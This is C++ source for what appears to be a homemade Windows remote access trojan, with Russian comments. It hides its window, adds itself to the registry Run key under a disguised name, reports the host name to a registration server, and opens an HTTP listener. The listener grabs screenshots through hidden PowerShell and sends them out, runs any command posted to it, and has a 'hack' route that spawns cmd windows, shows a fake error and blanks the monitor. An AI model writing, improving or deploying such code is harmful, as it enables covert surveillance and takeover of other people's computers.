#include <iostream>
#include <string>
#include <fstream>
#include <cstdlib>
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <Windows.h>
#include <filesystem>
#include <shellapi.h>

namespace net = boost::asio;
namespace beast = boost::beast;
using boost::asio::ip::tcp;

bool take_screenshot(const std::string& filename) {
    // 1. Стираем старый скриншот, чтобы проверка была честной
    std::remove(filename.c_str());

    // 2. В этой строке оставляем ТОЛЬКО параметры для PowerShell
    std::string arguments = "-WindowStyle Hidden -Command "
        "\"[Reflection.Assembly]::LoadWithPartialName('System.Drawing') | Out-Null; "
        "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; "
        "$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
        "$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; "
        "$graphics = [System.Drawing.Graphics]::FromImage($bmp); "
        "$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); "
        "$bmp.Save('" + filename + "', [System.Drawing.Imaging.ImageFormat]::Png); "
        "$graphics.Dispose(); "
        "$bmp.Dispose();\"";

    // 3. Вызываем ShellExecuteA правильно:
    // "powershell" идет в параметры файла, а arguments — в параметры аргументов
    ShellExecuteA(NULL, "open", "powershell", arguments.c_str(), NULL, SW_HIDE);

    // 4. Обязательно ждем, пока PowerShell создаст файл (так как он работает в фоне)
    for (int i = 0; i < 40; ++i) {
        std::ifstream check_file(filename);
        if (check_file.good()) {
            return true;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    return false;
}





int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    try {
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);

        HKEY key;
        char path[MAX_PATH];

        GetModuleFileNameA(NULL, path, MAX_PATH);

        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS)
        {
            RegSetValueExA(key, "windowsConsole", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
            RegCloseKey(key);
        }


        setlocale(LC_ALL, "ru");
        net::io_context ioc;

        try {
            tcp::socket sock1(ioc);
            tcp::resolver resolver(ioc);
            auto endpoints = resolver.resolve("192.168.0.107", "1001");
            net::connect(sock1, endpoints);

            std::string pc_name = net::ip::host_name();
            std::string msg = "REG:" + pc_name + '\n';

            net::write(sock1, net::buffer(msg));
            sock1.close();
        }
        catch (const std::exception&) {
            // Если сервер-регистратор недоступен, не падаем, а продолжаем запуск локального слушателя
        }

        tcp::acceptor acceptor(ioc, tcp::endpoint(tcp::v4(), 5005));

        std::cout << "[ПК Сервер] Легкий HTTP-сервер успешно запущен!" << std::endl;
        std::cout << "[Инфо] Ссылка для скриншота: http://192.168.1" << std::endl;

        while (true) {
            tcp::socket sock(ioc);
            acceptor.accept(sock);

            beast::http::request<beast::http::string_body> req;
            beast::flat_buffer buf;
            beast::http::read(sock, buf, req);

            std::string target = std::string(req.target());

            if (req.method() == beast::http::verb::post && target.find("hack") != std::string::npos)
            {
                // 1. Формируем и отправляем ответ телефону
                beast::http::response<beast::http::string_body> res(beast::http::status::ok, req.version());
                res.set(beast::http::field::content_type, "text/plain; charset=utf-8");
                res.body() = "YESSSS PC HUMAN DEAD!";
                res.prepare_payload();
                beast::http::write(sock, res);

                std::thread([=]()
                    {
                        for (int i = 0; i < 10; ++i)
                        {
                            std::system("start cmd.exe");

                            std::this_thread::sleep_for(std::chrono::milliseconds(200));
                        }
                    }).join();
                MessageBoxA(NULL, "Buy Buy", "Critical Error", MB_OK | MB_ICONHAND | MB_ICONERROR);

                SendMessageA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
                std::this_thread::sleep_for(std::chrono::seconds(1));
                SendMessageA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
                continue;
            }

            if (req.method() == beast::http::verb::get && target.find("screen") != std::string::npos) {
                std::cout << "[Сервер] Делаю легкий скриншот..." << std::endl;

                std::string filename = "screenshot.png";

                if (take_screenshot(filename)) {
                    beast::error_code ec;

                    // МАГИЯ ЗДЕСЬ: Оборачиваем создание и отправку ответа в фигурные скобки!
                    {
                        beast::http::response<beast::http::file_body> res(beast::http::status::ok, req.version());
                        res.set(beast::http::field::content_type, "image/png");
                        res.set(beast::http::field::connection, "close");

                        // Открываем файл встроенными средствами Boost.Beast (ifstream больше НЕ НУЖЕН!)
                        res.body().open(filename.c_str(), beast::file_mode::read, ec);

                        if (!ec) {
                            res.prepare_payload();
                            beast::http::write(sock, res); // Отправляем скриншот на телефон
                            std::cout << "[Сервер] Скриншот успешно отправлен!" << std::endl;
                        }
                        else {
                            std::cout << "[Ошибка] Не удалось открыть файл скриншота: " << ec.message() << '\n';
                        }
                    } // <- ТУТ ЗАКРЫВАЕТСЯ СКОБКА! Объект res уничтожается, файл закрывается в Windows,
                      // и всякая блокировка с картинки полностью снимается! [11.1]

                    // Безопасно закрываем сокет и мгновенно стираем файл с диска [11.2]
                    boost::system::error_code ignore_error;
                    sock.close();

                    std::filesystem::remove(filename, ignore_error); // Теперь он ЖЕЛЕЗНО удалится! [11.2]
                }
                else {
                    std::cout << "[Ошибка] PowerShell не смог сохранить изображение." << std::endl;
                    boost::system::error_code ignore_error;
                    sock.close();
                }
                continue; // Переходим к следующему кругу ожидания
            }

            // Секция POST для остальных консольных команд
            else if (req.method() == beast::http::verb::post) {
                beast::http::response<beast::http::string_body> res(beast::http::status::ok, req.version());
                res.set(beast::http::field::content_type, "text/plain; charset=utf-8");
                res.body() = "Command good play!";
                res.prepare_payload();
                beast::http::write(sock, res);

                // 2. Красиво и безопасно закрываем сетевое соединение, чтобы не было ошибки сокета
                beast::error_code ec;
                sock.shutdown(tcp::socket::shutdown_both, ec);
                sock.close();

                // Переводим команду телефона в обычную строку
                std::string command = std::string(req.body().data());
                std::cout << "[Сервер] Запускаю команду: " << command << std::endl;

                // 3. ПРОВЕРКА: Если команда содержит "shutdown", выключаем ПК особым образом
                if (command.find("shutdown") != std::string::npos) {
                    std::cout << "[ПК] Завершаю работу сервера и выключаю систему..." << std::endl;

                    // Вызываем выключение Windows через 5 секунд
                    std::system("shutdown /s /t 0");

                    // Немедленно завершаем саму C++ программу, чтобы она не выдавала ошибок сокета
                    std::exit(0);
                }
                else {
                    // Для всех остальных программ (calc, notepad и т.д.) запускаем их БЕЗ черного окна CMD
                    ShellExecuteA(NULL, "open", command.c_str(), NULL, NULL, SW_HIDE);
                }
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "[Ошибка]: " << e.what() << std::endl;
    }
    return 0;
}